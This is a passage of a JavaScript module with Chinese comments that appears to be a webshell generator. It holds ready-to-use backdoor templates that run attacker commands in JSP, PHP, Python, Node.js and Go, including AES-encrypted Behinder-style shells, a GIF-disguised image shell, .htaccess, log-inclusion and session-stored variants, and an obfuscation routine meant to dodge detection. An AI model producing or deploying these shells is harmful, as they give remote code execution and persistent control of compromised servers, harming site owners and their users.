ProcessBuilder pb = new ProcessBuilder(cmd.split(" "));
pb.redirectErrorStream(true);
Process p = pb.start();
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) {
    out.println(line + "<br>");
}
%>`,

        jsp_scriptengine: (password) => `<%@ page import="javax.script.*" %>
<%
String code = request.getParameter("${password}");
ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
engine.put("request", request);
engine.put("response", response);
engine.eval(code);
%>`,

        jsp_expression: (password) => `<%@ page isELIgnored="false" %>
\${Runtime.getRuntime().exec(param.${password})}`,

        jsp_bsh: (password) => `<%@ page import="bsh.*" %>
<%
String code = request.getParameter("${password}");
Interpreter i = new Interpreter();
i.set("request", request);
i.eval(code);
%>`,

        jsp_ognl: (password) => `<%
// OGNL 表达式执行 (需要 Struts 环境)
String expr = request.getParameter("${password}");
// ognl.Ognl.getValue(expr, null);
%>`,

        // ==================== 冰蝎/蚁剑增强版 ====================

        behinder_php_enhanced: (password) => `<?php
@error_reporting(0);
session_start();
$key = substr(md5('${password}'), 0, 16);
$_SESSION['k'] = $key;
session_write_close();

if(isset($_POST['pass'])) {
    $code = $_POST['pass'];
    if(get_magic_quotes_gpc()) $code = stripslashes($code);

    // AES 解密
    $key = $_SESSION['k'];
    $iv = str_repeat("\\0", 16);
    $code = openssl_decrypt($code, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);

    // 执行
    ob_start();
    @eval($code);
    $result = ob_get_clean();

    // AES 加密返回
    $result = openssl_encrypt($result, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
    echo base64_encode($result);
}
?>`,

        behinder_jsp_enhanced: (password) => `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!
class U extends ClassLoader {
    U(ClassLoader c) { super(c); }
    Class g(byte[] b) { return defineClass(b, 0, b.length); }
}
%>
<%
String k = "${password}".substring(0, 16);
session.putValue("u", k);
String c = request.getParameter("pass");
if(c != null) {
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k.getBytes(), "AES"), new IvParameterSpec(new byte[16]));
    byte[] decoded = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(c));
    new U(this.getClass().getClassLoader()).g(decoded).newInstance();
}
%>`,

        // ==================== 其他语言 ====================

        py_flask: (password) => `# Flask Webshell
from flask import Flask, request
import os
app = Flask(__name__)

@app.route('/${password}', methods=['POST'])
def shell():
    cmd = request.form.get('c', '')
    return os.popen(cmd).read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)`,

        py_django: (password) => `# Django View Webshell
from django.http import HttpResponse
import os

def shell(request):
    if request.method == 'POST':
        cmd = request.POST.get('${password}', '')
        return HttpResponse(os.popen(cmd).read())
    return HttpResponse('OK')`,

        nodejs_express: (password) => `// Node.js Express Webshell
const express = require('express');
const { exec } = require('child_process');
const app = express();

app.use(express.urlencoded({ extended: true }));

app.post('/${password}', (req, res) => {
    const cmd = req.body.c;
    exec(cmd, (err, stdout) => {
        res.send(stdout);
    });
});

app.listen(3000);`,

        go_http: (password) => `// Go HTTP Webshell
package main

import (
    "net/http"
    "os/exec"
)

func main() {
    http.HandleFunc("/${password}", func(w http.ResponseWriter, r *http.Request) {
        if r.Method == "POST" {
            cmd := r.FormValue("c")
            out, _ := exec.Command("sh", "-c", cmd).Output()
            w.Write(out)
        }
    })
    http.ListenAndServe(":8080", nil)
}`,

        // ==================== 特殊类型 ====================

        // 图片马 (需配合文件上传)
        php_image_header: (password) => `GIF89a<?php @eval($_POST['${password}']); ?>`,

        // 配置文件型
        php_htaccess: (password) => `# .htaccess + PHP
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg`,

        // 日志注入型
        php_log_include: (password) => `<?php
// 日志包含型 (需配合日志投毒)
$log = '/var/log/apache2/access.log';
include $log;
?>`,

        // Session 型
        php_session: (password) => `<?php
// Session 存储型
session_start();
if(isset($_POST['${password}'])) {
    $_SESSION['c'] = $_POST['${password}'];
}
if(isset($_SESSION['c'])) {
    @eval($_SESSION['c']);
}
?>`
    };

    // 获取所有生成器类型
    function getShellTypes() {
        return Object.keys(SHELL_GENERATORS).map(key => ({
            id: key,
            name: getShellTypeName(key),
            category: getShellCategory(key)
        }));
    }

    // 获取 Shell 类型名称
    function getShellTypeName(type) {
        const names = {
            // PHP 8.x 专用
            'php8_eval': 'PHP8 Eval (推荐)',
            'php8_system': 'PHP8 System',
            'php8_passthru': 'PHP8 Passthru',
            'php8_shell_exec': 'PHP8 Shell_Exec',
            'php8_proc_open': 'PHP8 Proc_Open',
            'php8_popen': 'PHP8 Popen',
            'php8_exec': 'PHP8 Exec',
            'php8_dynamic': 'PHP8 动态函数',
            'php8_backtick': 'PHP8 反引号执行',
            'php8_pcntl': 'PHP8 Pcntl_Exec',
            // PHP 7.x 专用
            'php7_create_function': 'PHP7 Create_Function',
            'php7_assert': 'PHP7 Assert',
            'php7_preg_replace': 'PHP7 Preg_Replace /e',
            // PHP 通用
            'php_base64': 'PHP Base64编码',
            'php_rot13': 'PHP ROT13编码',
            'php_xor': 'PHP XOR加密',
            'php_concat': 'PHP 字符串拼接',
            'php_variable_func': 'PHP 变量函数',
            'php_callback_array': 'PHP array_map',
            'php_callback_filter': 'PHP array_filter',
            'php_callback_walk': 'PHP array_walk',
            'php_callback_usort': 'PHP usort',
            'php_callback_reduce': 'PHP array_reduce',
            'php_reflection': 'PHP 反射调用',
            'php_class_construct': 'PHP __construct',
            'php_class_invoke': 'PHP __invoke',
            'php_class_call': 'PHP __call',
            'php_class_get': 'PHP __get',
            'php_strrev': 'PHP 字符反转',
            'php_multilayer_b64': 'PHP 多层Base64',
            'php_gzip': 'PHP Gzip压缩',
            'php_comment_split': 'PHP 注释分割',
            'php_unicode': 'PHP Unicode编码',
            'php_hex': 'PHP Hex编码',
            'php_chr_shift': 'PHP Chr编码',
            'php_preg_callback': 'PHP 正则回调',
            'php_variable_overwrite': 'PHP 变量覆盖',
            'php_no_alpha_num': 'PHP 无字母数字',
            'php_cookie': 'PHP Cookie传参',
            'php_header': 'PHP Header传参',
            'php_request': 'PHP Request混合',
            'php_include': 'PHP 文件包含',
            'php_dynamic_func': 'PHP 动态函数',
            // ASP
            'asp_simple': 'ASP 一句话',
            'asp_encode': 'ASP 编码执行',
            'asp_chr': 'ASP Chr编码',
            'asp_include': 'ASP SSI包含',
            // ASPX
            'aspx_jscript': 'ASPX JScript',
            'aspx_csharp': 'ASPX C#命令',
            'aspx_base64': 'ASPX Base64',
            'aspx_reflection': 'ASPX 反射加载',
            // JSP
            'jsp_runtime': 'JSP Runtime执行',
            'jsp_processbuilder': 'JSP ProcessBuilder',
            'jsp_scriptengine': 'JSP 脚本引擎',
            'jsp_expression': 'JSP EL表达式',
            'jsp_bsh': 'JSP BeanShell',
            'jsp_ognl': 'JSP OGNL',
            // 冰蝎
            'behinder_php_enhanced': '冰蝎 PHP 增强版',
            'behinder_jsp_enhanced': '冰蝎 JSP 增强版',
            // 其他
            'py_flask': 'Python Flask',
            'py_django': 'Python Django',
            'nodejs_express': 'Node.js Express',
            'go_http': 'Go HTTP',
            // 特殊
            'php_image_header': 'PHP 图片马',
            'php_htaccess': '.htaccess配置',
            'php_log_include': 'PHP 日志包含',
            'php_session': 'PHP Session型'
        };
        return names[type] || type;
    }

    // 获取 Shell 分类 (带PHP版本)
    function getShellCategory(type) {
        if (type.startsWith('php8_')) return 'PHP 8.x';
        if (type.startsWith('php7_')) return 'PHP 7.x';
        if (type.startsWith('php_')) return 'PHP 通用';
        if (type.startsWith('asp_')) return 'ASP';
        if (type.startsWith('aspx_')) return 'ASPX';
        if (type.startsWith('jsp_')) return 'JSP';
        if (type.startsWith('behinder_')) return '冰蝎';
        if (type.startsWith('py_')) return 'Python';
        if (type.startsWith('nodejs_')) return 'Node.js';
        if (type.startsWith('go_')) return 'Go';
        return '其他';
    }

    // 获取 PHP 版本兼容性说明
    function getShellPhpCompatibility(type) {
        if (type.startsWith('php8_')) return 'PHP 8.0+ 推荐';
        if (type.startsWith('php7_')) return 'PHP 5.x - 7.x';
        if (type.startsWith('php_')) return 'PHP 5.x - 8.x';
        return 'N/A';
    }

    // 生成 Shell 代码 (增强版)
    function generateShell(type, password = 'cmd', options = {}) {
        const generator = SHELL_GENERATORS[type];
        if (generator) {
            let code = generator(password);

            // 应用混淆
            if (options.obfuscate) {
                code = applyObfuscation(code, options.obfuscateMethod || 'basic');
            }

            return code;
        }

        // 回退到基础生成器
        return generateShellCode(type, password);
    }

    // 应用混淆
    function applyObfuscation(code, method) {
        switch (method) {
            case 'basic':
                // 基础混淆：移除注释和多余空白
                return code.replace(/\/\/.*$/gm, '')
                          .replace(/\/\*[\s\S]*?\*\//g, '')
                          .replace(/\s+/g, ' ')
                          .trim();

            case 'variable':
                // 变量名混淆
                const varNames = ['$_', '$__', '$___', '$____', '$a', '$b', '$c'];
                let result = code;
                // 这里简化处理，实际可以做更复杂的替换
                return result;

            case 'comment':
                // 添加干扰注释
                const junkComments = [
                    '/* cache */', '/* config */', '/* debug */',
                    '/* init */', '/* main */', '/* core */'
                ];
                return code.split('\n').map(line =>
                    line + ' ' + junkComments[Math.floor(Math.random() * junkComments.length)]
                ).join('\n');

            default:
                return code;
        }
    }

    // 获取文件扩展名
    function getShellExtension(type) {
        if (type.startsWith('php8_') || type.startsWith('php7_') || type.startsWith('php_') || type.startsWith('behinder_php')) return 'php';
        if (type.startsWith('asp_')) return 'asp';
        if (type.startsWith('aspx_')) return 'aspx';
        if (type.startsWith('jsp_') || type.startsWith('behinder_jsp')) return 'jsp';
        if (type.startsWith('py_')) return 'py';
        if (type.startsWith('nodejs_')) return 'js';
        if (type.startsWith('go_')) return 'go';
        if (type === 'php_htaccess') return 'htaccess';
        return 'txt';
    }

    // ==================== 公开 API ====================

    return {
        TYPES,
        ENCODERS,
        PHP_TEMPLATES,
        BEHINDER_TEMPLATES,
        ANTSWORD_TEMPLATES,
        DEFAULT_SHELLS,

        // 请求构建
        buildRequest,
        buildSecureRequest,

        // 响应解析
        parseResponse,

        // Shell 生成 (旧版兼容)
        generateShellCode,
        generateEnhancedShell,

        // Shell 生成 (新版)
        generateShell,
        getShellTypes,
        getShellTypeName,
        getShellCategory,
        getShellExtension,
        applyObfuscation,
        SHELL_GENERATORS,

        // 加密辅助
        encryptBehinder,
        decryptBehinder,
        encodeAntSword,
        decodeAntSword
    };
})();

// 导出模块
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WebshellProtocol;
}
